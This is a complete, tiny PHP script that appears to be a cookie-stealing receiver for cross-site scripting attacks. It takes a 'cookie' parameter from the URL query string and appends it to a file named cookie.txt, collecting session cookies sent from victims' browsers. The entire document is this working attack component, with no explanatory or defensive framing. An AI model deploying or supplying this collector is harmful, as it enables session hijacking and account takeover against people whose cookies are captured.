<?php 
$cookie = "";
$cookie = $_GET['cookie'];
$f = fopen("cookie.txt","a");
fwrite($f,$cookie);
fclose($f);
?>